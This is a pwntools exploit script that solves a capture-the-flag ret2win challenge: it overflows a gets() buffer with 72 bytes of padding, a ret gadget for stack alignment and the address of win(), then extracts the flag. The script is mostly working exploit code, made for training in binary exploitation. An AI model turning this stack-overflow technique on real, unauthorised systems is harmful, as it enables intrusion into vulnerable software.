#!/usr/bin/env python3
"""
Solver for W challenge - Simple ret2win buffer overflow

Vulnerability: gets() is used on a 64-byte buffer without bounds checking.
Exploitation: Overflow the buffer to overwrite the return address with the 
              address of the win() function.

Buffer layout:
- 64 bytes: buffer
- 8 bytes: saved RBP
- 8 bytes: return address (overwrite with win() address)

Total offset to return address: 64 + 8 = 72 bytes
"""

from pwn import *

# Context setup
context.arch = 'amd64'
context.log_level = 'info'

def exploit(host=None, port=None):
    # Load the binary to find win() address
    if args.REMOTE or host:
        # For remote, we need the binary to be in dist/ or current directory
        try:
            elf = ELF('./vuln', checksec=False)
        except:
            elf = ELF('../dist/vuln', checksec=False)
        io = remote(host or args.HOST, port or int(args.PORT))
    else:
        elf = ELF('./vuln', checksec=False)
        io = process('./vuln')
    
    # Find the address of win() function
    win_addr = elf.symbols['win']
    log.info(f"win() function at: {hex(win_addr)}")
    
    # Find a ret gadget for stack alignment
    # In x86-64, the stack must be 16-byte aligned before a call instruction
    # Using a ret gadget fixes this alignment issue
    ret_gadget = 0x40101a  # ret gadget found in binary
    
    # Build the payload
    # Offset = 64 (buffer) + 8 (saved RBP) = 72
    offset = 72
    payload = b'A' * offset
    payload += p64(ret_gadget)  # Stack alignment
    payload += p64(win_addr)
    
    log.info(f"Payload length: {len(payload)}")
    
    # Wait for prompt and send payload
    io.recvuntil(b"What's your name? ")
    io.sendline(payload)
    
    # Receive all output and find the flag
    try:
        output = io.recvall(timeout=3).decode()
        log.info(f"Received output:\n{output}")
        
        # Look for flag in output
        for line in output.split('\n'):
            if 'SnapanCTF{' in line or 'FLAG{' in line:
                flag = line.strip()
                log.success(f"Flag: {flag}")
                io.close()
                return flag
        
        # If no flag pattern found, print all output
        log.warning("Flag pattern not found in output")
        log.info(f"Full output: {output}")
    except Exception as e:
        log.error(f"Error: {e}")
    
    io.close()

if __name__ == '__main__':
    if args.REMOTE or args.HOST:
        exploit()
    else:
        # Local testing
        print("Run with: python solve.py REMOTE HOST=<ip> PORT=<port>")
        print("Or for local: compile vuln binary first, then run without args")
        
        # Try local if binary exists
        if os.path.exists('./vuln') or os.path.exists('../dist/vuln'):
            exploit()
